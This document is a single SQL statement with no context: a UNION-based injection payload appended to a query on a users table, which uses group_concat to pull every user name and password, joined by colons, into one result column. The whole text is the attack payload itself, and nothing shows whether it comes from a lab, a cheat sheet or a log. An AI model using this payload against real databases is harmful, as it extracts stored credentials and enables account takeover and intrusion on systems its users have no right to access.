select * from users where user_id = 1 union all select 1,(select group_concat(user,0x3a,password) from users),3,4,5,6;
